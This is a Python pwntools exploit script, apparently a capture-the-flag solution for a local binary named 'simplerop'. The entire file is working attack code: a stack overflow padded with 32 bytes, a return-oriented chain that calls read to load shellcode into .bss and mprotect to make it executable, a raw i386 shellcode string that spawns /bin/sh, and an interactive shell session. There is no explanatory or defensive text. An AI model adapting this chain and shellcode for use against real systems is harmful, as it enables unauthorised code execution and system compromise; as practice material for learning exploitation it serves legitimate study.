from pwn import *

s = process("./simplerop")
e = ELF("./simplerop")
#context.log_level = 'debug'

s.recvuntil(":")

mprotect_add = e.symbols['mprotect']
read = 0x806cd50
pppr = 0x804838c

#shellcode = asm(shellcraft.i386.linux.sh(),arch='i386')
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = "A"*32
payload += p32(read)
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss())
payload += p32(255)

payload += p32(mprotect_add)
payload += p32(pppr)
payload += p32(0x080ea000)
payload += p32(0x3000)
payload += p32(7)
payload += p32(e.bss())

s.sendline(payload)
s.sendline(shellcode)

s.interactive()
